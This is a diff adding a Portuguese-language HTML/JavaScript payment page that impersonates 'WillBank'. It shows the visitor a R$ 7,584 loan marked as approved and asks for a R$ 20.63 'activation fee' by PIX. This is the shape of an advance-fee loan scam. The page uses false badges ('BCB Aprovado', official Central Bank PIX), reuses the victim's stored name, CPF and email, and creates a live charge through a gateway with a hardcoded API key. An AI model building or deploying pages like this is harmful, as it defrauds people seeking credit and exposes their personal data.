@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento PIX | WillBank</title>
+    <script src="../../3.4.17"></script>
+    <link rel="stylesheet" href="../../css/all.min.css">
+    <link href="../../css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        shopee: {
+                            light: "#cab600",
+                            DEFAULT: "#f5d317",
+                            dark: "#ffd900",
+                        },
+                    },
+                },
+            },
+        };
+    </script>
+    
+    <style>
+        body {
+            font-family: "Poppins", sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        
+        .checkout-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .security-badge {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        
+        .card-input {
+            background: rgba(255, 255, 255, 0.9);
+            border: 2px solid #e2e8f0;
+            transition: all 0.3s ease;
+        }
+        
+        .card-input:focus {
+            border-color: #f5d317;
+            box-shadow: 0 0 0 3px rgba(245, 211, 23, 0.1);
+        }
+        
+        .btn-pay {
+            background: linear-gradient(135deg, #f5d317 0%, #cab600 100%);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-pay:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(245, 211, 23, 0.3);
+        }
+        
+        .btn-pay:after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.3) 50%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { left: -100%; opacity: 0; }
+            10% { left: 100%; opacity: 0.6; }
+            100% { left: 100%; opacity: 0; }
+        }
+        
+        .loading-spinner {
+            border: 3px solid #f3f4f6;
+            border-top: 3px solid #f5d317;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-checkmark {
+            color: #28a745;
+            animation: bounce 0.6s ease-in-out;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="checkout-container max-w-md w-full rounded-2xl shadow-2xl p-8">
+        <!-- Header com Logo -->
+        <div class="text-center mb-8">
+            <div class="flex items-center justify-center mb-4">
+                <img src="../../images?q=tbn:ANd9GcQtF4d5voZs-uursQomBUaKsPkTw8evy5PwsA&s" alt="WillBank" class="h-12">
+                <span class="ml-3 text-2xl font-bold text-gray-800">WillBank</span>
+            </div>
+            <div class="security-badge inline-flex items-center px-4 py-2 rounded-full text-white text-sm font-medium">
+                <i class="fas fa-shield-alt mr-2"></i>
+                Pagamento 100% Seguro
+            </div>
+        </div>
+
+        <!-- Informações do Pedido -->
+        <div class="bg-gray-50 rounded-xl p-6 mb-6">
+            <h2 class="text-lg font-semibold text-gray-800 mb-4">Resumo do Pedido</h2>
+            <div class="space-y-3">
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-600">Valor Aprovado:</span>
+                    <span class="font-bold text-xl text-shopee" id="valorAprovado">R$ 7.584,00</span>
+                </div>
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-600">Taxa de Ativação:</span>
+                    <span class="font-semibold text-gray-800">R$ 20,63</span>
+                </div>
+                <hr class="border-gray-200">
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-600">Total a Pagar:</span>
+                    <span class="font-bold text-xl text-gray-800">R$ 20,63</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Formulário de Pagamento PIX -->
+        <div id="pixForm" class="space-y-6">
+            <!-- Informações do PIX -->
+            <div class="bg-blue-50 rounded-xl p-4 mb-6">
+                <div class="flex items-center">
+                    <div class="bg-blue-100 rounded-full p-2 mr-3">
+                        <i class="fas fa-qrcode text-blue-600"></i>
+                    </div>
+                    <div>
+                        <h3 class="font-semibold text-blue-800">Pagamento via PIX</h3>
+                        <p class="text-sm text-blue-600">Escaneie o QR Code ou copie o código PIX</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- QR Code Container -->
+            <div id="qrCodeContainer" class="text-center hidden">
+                <div class="bg-white rounded-xl p-6 border-2 border-gray-100 mb-4">
+                    <div id="qrCodeImage" class="mx-auto mb-4"></div>
+                    <p class="text-sm text-gray-600 mb-4">Escaneie o QR Code com seu app bancário</p>
+                </div>
+
+                <!-- Código PIX Copiável -->
+                <div class="bg-gray-50 rounded-xl p-4 mb-6">
+                    <label class="block text-gray-700 font-medium mb-2">Código PIX</label>
+                    <div class="flex">
+                        <input type="text" id="pixCode" readonly 
+                               class="flex-1 bg-white border border-gray-300 rounded-l-xl px-4 py-3 text-sm font-mono">
+                        <button type="button" id="copyPixButton" 
+                                class="bg-shopee text-white px-4 py-3 rounded-r-xl hover:bg-shopee-dark transition-colors">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Status do Pagamento -->
+                <div id="paymentStatus" class="bg-yellow-50 rounded-xl p-4 mb-6">
+                    <div class="flex items-center">
+                        <div class="animate-spin rounded-full h-6 w-6 border-b-2 border-yellow-600 mr-3"></div>
+                        <div>
+                            <h4 class="font-semibold text-yellow-800">Aguardando Pagamento</h4>
+                            <p class="text-sm text-yellow-600">Aguarde a confirmação do PIX</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Botão de Verificar Status -->
+                <button type="button" id="checkStatusButton" 
+                        class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl transition-all">
+                    <i class="fas fa-sync-alt mr-2"></i>
+                    Verificar Status do Pagamento
+                </button>
+            </div>
+
+            <!-- Botão Inicial -->
+            <button type="button" id="generatePixButton" 
+                    class="btn-pay w-full text-white text-lg font-bold py-4 rounded-xl relative">
+                <span id="payButtonText">
+                    <i class="fab fa-pix mr-2"></i>
+                    Gerar PIX - R$ 20,63
+                </span>
+                <div id="loadingSpinner" class="loading-spinner hidden"></div>
+            </button>
+        </div>
+
+        <!-- Informações de Segurança -->
+        <div class="mt-6 text-center">
+            <div class="flex items-center justify-center space-x-4 text-sm text-gray-600 mb-4">
+                <div class="flex items-center">
+                    <i class="fas fa-lock text-green-500 mr-1"></i>
+                    <span>SSL Criptografado</span>
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-shield-alt text-blue-500 mr-1"></i>
+                    <span>PIX Seguro</span>
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-check-circle text-green-500 mr-1"></i>
+                    <span>BCB Aprovado</span>
+                </div>
+            </div>
+            <p class="text-xs text-gray-500">
+                Pagamento via PIX oficial do Banco Central do Brasil
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Configurações da API
+        const API_CONFIG = {
+            url: 'https://api.syncpay.pro/v1/gateway/api/',
+            apiKey: 'd0bb944b4e93470dfc084a95',
+            postbackUrl: window.location.origin + '/webhook/pix-status.php'
+        };
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Carregar valor aprovado do localStorage
+            const valorAprovado = localStorage.getItem('creditoAprovado') || '7.584,00';
+            document.getElementById('valorAprovado').textContent = 'R$ ' + valorAprovado;
+
+            // Elementos do DOM
+            const generatePixButton = document.getElementById('generatePixButton');
+            const qrCodeContainer = document.getElementById('qrCodeContainer');
+            const qrCodeImage = document.getElementById('qrCodeImage');
+            const pixCode = document.getElementById('pixCode');
+            const copyPixButton = document.getElementById('copyPixButton');
+            const paymentStatus = document.getElementById('paymentStatus');
+            const checkStatusButton = document.getElementById('checkStatusButton');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const payButtonText = document.getElementById('payButtonText');
+
+            let currentTransactionId = null;
+            let statusCheckInterval = null;
+
+            // Gerar PIX
+            generatePixButton.addEventListener('click', async function() {
+                try {
+                    // Mostrar loading
+                    generatePixButton.disabled = true;
+                    payButtonText.classList.add('hidden');
+                    loadingSpinner.classList.remove('hidden');
+
+                    // Obter dados do usuário do localStorage
+                    const nomeUsuario = localStorage.getItem('nomeUsuario') || 'Cliente WillBank';
+                    const cpfUsuario = localStorage.getItem('cpfUsuario') || '00000000000';
+                    const emailUsuario = localStorage.getItem('emailUsuario') || 'cliente@willbank.com';
+
+                    // Preparar dados para a API
+                    const pixData = {
+                        amount: 20.63,
+                        customer: {
+                            name: nomeUsuario,
+                            email: emailUsuario,
+                            cpf: cpfUsuario.replace(/\D/g, ''),
+                            phone: "(11) 99999-9999"
+                        },
+                        pix: {
+                            expiresInDays: 1
+                        },
+                        items: [
+                            {
+                                title: "Taxa de Ativação - WillBank",
+                                quantity: 1,
+                                unitPrice: 20.63,
+                                tangible: false
+                            }
+                        ],
+                        postbackUrl: API_CONFIG.postbackUrl,
+                        metadata: "WillBank - Taxa de Ativação",
+                        traceable: true
+                    };
+
+                    // Fazer requisição para a API
+                    const response = await fetch(API_CONFIG.url, {
+                        method: 'POST',
+                        headers: {
+                            'Authorization': 'Basic ' + btoa(API_CONFIG.apiKey),
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(pixData)
+                    });
+
+                    const result = await response.json();
+
+                    if (response.ok && result.status === 'success') {
+                        // Sucesso - mostrar QR Code
+                        currentTransactionId = result.idTransaction;
+                        
+                        // Gerar QR Code
+                        await generateQRCode(result.paymentCode);
+                        
+                        // Preencher código PIX
+                        pixCode.value = result.paymentCode;
+                        
+                        // Mostrar container do PIX
+                        qrCodeContainer.classList.remove('hidden');
+                        generatePixButton.classList.add('hidden');
+                        
+                        // Iniciar verificação de status
+                        startStatusCheck();
+                        
+                    } else {
+                        throw new Error(result.message || 'Erro ao gerar PIX');
+                    }
+
+                } catch (error) {
+                    console.error('Erro:', error);
+                    alert('Erro ao gerar PIX: ' + error.message);
+                } finally {
+                    // Esconder loading
+                    generatePixButton.disabled = false;
+                    payButtonText.classList.remove('hidden');
+                    loadingSpinner.classList.add('hidden');
+                }
+            });
+
+            // Copiar código PIX
+            copyPixButton.addEventListener('click', function() {
+                pixCode.select();
+                document.execCommand('copy');
+                
+                // Feedback visual
+                const originalText = copyPixButton.innerHTML;
+                copyPixButton.innerHTML = '<i class="fas fa-check"></i>';
+                copyPixButton.classList.add('bg-green-500');
+                
+                setTimeout(() => {
+                    copyPixButton.innerHTML = originalText;
+                    copyPixButton.classList.remove('bg-green-500');
+                }, 2000);
+            });
+
+            // Verificar status do pagamento
+            checkStatusButton.addEventListener('click', async function() {
+                await checkPaymentStatus();
+            });
+
+            // Função para gerar QR Code
+            async function generateQRCode(pixCode) {
+                try {
+                    // Usar API gratuita para gerar QR Code
+                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
+                    
+                    const img = document.createElement('img');
+                    img.src = qrUrl;
+                    img.alt = 'QR Code PIX';
+                    img.className = 'mx-auto';
+                    
+                    qrCodeImage.innerHTML = '';
+                    qrCodeImage.appendChild(img);
+                    
+                } catch (error) {
+                    console.error('Erro ao gerar QR Code:', error);
+                    qrCodeImage.innerHTML = '<p class="text-red-500">Erro ao gerar QR Code</p>';
+                }
+            }
+
+            // Função para verificar status do pagamento
+            async function checkPaymentStatus() {
+                if (!currentTransactionId) return;
+
+                try {
+                    checkStatusButton.disabled = true;
+                    checkStatusButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verificando...';
+
+                    // Verificar status via nosso endpoint
+                    const response = await fetch(`../../webhook/check-status.php?id=${currentTransactionId}`, {
+                        method: 'GET',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });
+
+                    if (response.ok) {
+                        const result = await response.json();
+                        console.log('Status da transação:', result);
+
+                        if (result.status === 'success') {
+                            const statusData = result.data;
+                            
+                            if (statusData.status_transaction === 'PAID') {
+                                // Pagamento confirmado
+                                paymentStatus.innerHTML = `
+                                    <div class="flex items-center">
+                                        <div class="bg-green-100 rounded-full p-2 mr-3">
+                                            <i class="fas fa-check text-green-600"></i>
+                                        </div>
+                                        <div>
+                                            <h4 class="font-semibold text-green-800">Pagamento Confirmado!</h4>
+                                            <p class="text-sm text-green-600">Seu empréstimo será liberado em breve</p>
+                                        </div>
+                                    </div>
+                                `;
+                                
+                                // Parar verificação automática
+                                if (statusCheckInterval) {
+                                    clearInterval(statusCheckInterval);
+                                }
+                                
+                                // Redirecionar para sucesso após 2 segundos
+                                setTimeout(() => {
+                                    window.location.href = '../sucesso/';
+                                }, 2000);
+                                return;
+                                
+                            } else if (statusData.status_transaction === 'EXPIRED') {
+                                // PIX expirado
+                                paymentStatus.innerHTML = `
+                                    <div class="flex items-center">
+                                        <div class="bg-red-100 rounded-full p-2 mr-3">
+                                            <i class="fas fa-exclamation-triangle text-red-600"></i>
+                                        </div>
+                                        <div>
+                                            <h4 class="font-semibold text-red-800">PIX Expirado</h4>
+                                            <p class="text-sm text-red-600">O PIX expirou. Gere um novo PIX.</p>
+                                        </div>
+                                    </div>
+                                `;
+                                
+                                // Parar verificação automática
+                                if (statusCheckInterval) {
+                                    clearInterval(statusCheckInterval);
+                                }
+                                
+                                // Mostrar botão para gerar novo PIX
+                                checkStatusButton.innerHTML = '<i class="fas fa-redo mr-2"></i>Gerar Novo PIX';
+                                checkStatusButton.onclick = () => {
+                                    location.reload();
+                                };
+                                checkStatusButton.disabled = false;
+                                return;
+                                
+                            } else if (statusData.status_transaction === 'CANCELLED') {
+                                // PIX cancelado
+                                paymentStatus.innerHTML = `
+                                    <div class="flex items-center">
+                                        <div class="bg-red-100 rounded-full p-2 mr-3">
+                                            <i class="fas fa-times text-red-600"></i>
+                                        </div>
+                                        <div>
+                                            <h4 class="font-semibold text-red-800">PIX Cancelado</h4>
+                                            <p class="text-sm text-red-600">O PIX foi cancelado. Gere um novo PIX.</p>
+                                        </div>
+                                    </div>
+                                `;
+                                
+                                // Parar verificação automática
+                                if (statusCheckInterval) {
+                                    clearInterval(statusCheckInterval);
+                                }
+                                
+                                // Mostrar botão para gerar novo PIX
+                                checkStatusButton.innerHTML = '<i class="fas fa-redo mr-2"></i>Gerar Novo PIX';
+                                checkStatusButton.onclick = () => {
+                                    location.reload();
+                                };
+                                checkStatusButton.disabled = false;
+                                return;
+                                
+                            } else {
+                                // Ainda aguardando pagamento
+                                paymentStatus.innerHTML = `
+                                    <div class="flex items-center">
+                                        <div class="animate-spin rounded-full h-6 w-6 border-b-2 border-yellow-600 mr-3"></div>
+                                        <div>
+                                            <h4 class="font-semibold text-yellow-800">Aguardando Pagamento</h4>
+                                            <p class="text-sm text-yellow-600">Escaneie o QR Code ou copie o código PIX</p>
+                                        </div>
+                                    </div>
+                                `;
+                                
+                                checkStatusButton.innerHTML = '<i class="fas fa-sync-alt mr-2"></i>Verificar Status do Pagamento';
+                                checkStatusButton.disabled = false;
+                            }
+                        } else {
+                            throw new Error('Erro ao verificar status da transação');
+                        }
+                    } else {
+                        throw new Error('Erro na requisição de status');
+                    }
+
+                } catch (error) {
+                    console.error('Erro ao verificar status:', error);
+                    
+                    // Em caso de erro, mostrar mensagem amigável
+                    paymentStatus.innerHTML = `
+                        <div class="flex items-center">
+                            <div class="bg-orange-100 rounded-full p-2 mr-3">
+                                <i class="fas fa-info-circle text-orange-600"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold text-orange-800">Verificação em Andamento</h4>
+                                <p class="text-sm text-orange-600">Aguarde alguns instantes e tente novamente</p>
+                            </div>
+                        </div>
+                    `;
+                    
+                    checkStatusButton.innerHTML = '<i class="fas fa-sync-alt mr-2"></i>Verificar Status do Pagamento';
+                    checkStatusButton.disabled = false;
+                }
+            }
+
+            // Função para iniciar verificação automática de status
+            function startStatusCheck() {
+                // Verificar a cada 10 segundos
+                statusCheckInterval = setInterval(async () => {
+                    await checkPaymentStatus();
+                }, 10000);
+            }
+
+            // Limpar intervalo quando a página for fechada
+            window.addEventListener('beforeunload', function() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+            });
+        });
+    </script>
+</body>
+</html> 
